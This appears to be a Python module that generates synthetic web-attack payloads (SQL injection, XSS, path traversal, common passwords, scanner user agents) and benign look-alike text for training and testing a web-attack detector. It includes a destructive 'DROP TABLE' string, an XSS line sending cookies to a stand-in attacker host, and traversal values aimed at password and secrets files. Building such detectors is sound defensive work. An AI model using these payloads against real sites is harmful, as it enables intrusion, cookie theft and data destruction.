"""Attack payload catalogue.

Each generator returns (value, variant). `variant` records which evasion trick
was applied ("none" = plain textbook payload). Evasion tricks are what make the
rules-only detector miss some attacks -- and what the AI should help catch.
"""
import random
from urllib.parse import quote

SQLI_BASE = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT id, username, password FROM users --",
    "' UNION SELECT 1, 2, 3 --",
    "' AND 1=2 UNION SELECT id, username, role FROM users --",
    "') OR ('1'='1",
    "' ORDER BY 5 --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "1' AND SLEEP(5) --",
    "' UNION SELECT name, sql, 1 FROM sqlite_master --",
]

XSS_BASE = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.cookie)>",
    "\"><script>fetch('//evil.example/?c='+document.cookie)</script>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<body onload=alert('XSS')>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

# Hand-made evasive XSS payloads: (payload, variant)
XSS_EVASIVE = [
    ("<scr<script>ipt>alert(1)</scr</script>ipt>", "nested"),
    ("<img src=x oNErRor=\"&#97;lert(1)\">", "entity"),
    ("<svg><script>alert&#40;1&#41;</script>", "entity"),
]

# Raw query values for /files?name=...  (already encoded the way they travel on the wire)
TRAVERSAL = [
    ("../../etc/passwd", "none"),
    ("../../../../etc/passwd", "none"),
    ("/etc/passwd", "none"),
    ("../../app/config/secrets.env", "none"),
    ("..%2f..%2fetc%2fpasswd", "encoded"),
    ("%2e%2e/%2e%2e/etc/passwd", "encoded"),
    ("..%252f..%252fetc%252fpasswd", "double_encoded"),
    ("....//....//etc/passwd", "nested"),
    ("..%5c..%5cetc%5cpasswd", "backslash"),
]

BRUTE_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123", "letmein", "welcome",
    "admin", "admin123", "iloveyou", "monkey", "dragon", "football", "master",
    "sunshine", "princess", "passw0rd", "trustno1", "changeme", "P@ssw0rd",
]

# Default user agents of noisy attack tools. Only a minority of attackers keep them
# (careful ones change the header in one second); when they do, the whole session is
# an automated tool run and every request in it is an attack.
SCANNER_UAS = {
    "sqli": "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "path_traversal": "Nikto/2.5.0",
    "brute_force": "Mozilla/4.0 (Hydra)",
}


def mix_case(text: str, rng: random.Random) -> str:
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in text)


def sqli(rng: random.Random, where: str) -> tuple[str, str]:
    """where='query' -> percent-encoded query value; where='body' -> plain string."""
    base = rng.choice(SQLI_BASE)
    if where == "query":
        variant = rng.choices(["none", "case", "comment", "double_encoded"], [4, 2, 2, 1])[0]
    else:
        variant = rng.choices(["none", "case", "comment"], [4, 2, 2])[0]

    payload = base
    if variant == "case":
        payload = mix_case(base, rng)
    elif variant == "comment":
        payload = base.replace(" ", "/**/")

    if where == "query":
        encoded = quote(payload, safe="")
        if variant == "double_encoded":
            encoded = quote(encoded, safe="")
        return encoded, variant
    return payload, variant


def xss(rng: random.Random) -> tuple[str, str]:
    if rng.random() < 0.25:
        return rng.choice(XSS_EVASIVE)
    base = rng.choice(XSS_BASE)
    if rng.random() < 0.3:
        return mix_case(base, rng), "case"
    return base, "none"


def traversal(rng: random.Random) -> tuple[str, str]:
    return rng.choice(TRAVERSAL)


# Harmless text full of characters attackers also use (quotes, dashes, <, >, %, SQL/HTML words).
# Extra TRAINING data for the payload classifier, so it does not learn "-- means attack".
BENIGN_TEXT = [
    "Don't miss out -- limited offer", "well-known brand -- great value", "a 10-12 year -- old design",
    "order by size or color", "select your size", "drop me a line", "works great -- version 2.0", "tom & jerry",
    "5 < 10 and 10 > 3", "rock 'n' roll", "100% cotton", "(set of 3)", "buy 1 get 1; free shipping",
    "union jack flag", "x -- y", "O'Reilly book", "Q&A: what's included?", "coffee / tea",
    "ice-cream -- vanilla", "<3 love it", "great :) -- 5 stars", "email me at a@b.com", "notes for C:\\temp",
    "path/to/file.txt", "version 1.2.3-beta", "2 + 2 = 4", "he said \"hello\"", "it's -- well -- fine",
    "drop-in replacement", "insert coin to play", "update available", "delete my account please", "or maybe not",
    "price: $10 -- $20", "script writing guide", "alert: low stock", "javascript tutorial book", "onion rings",
    "select a gift from the list", "good -- not great", "size M -- fits well", "50% off -- today only",
    "wait -- what?", "my kid's toy -- broke", "it's a 3-pack", "union of two sets", "from A to B -- fast",
]
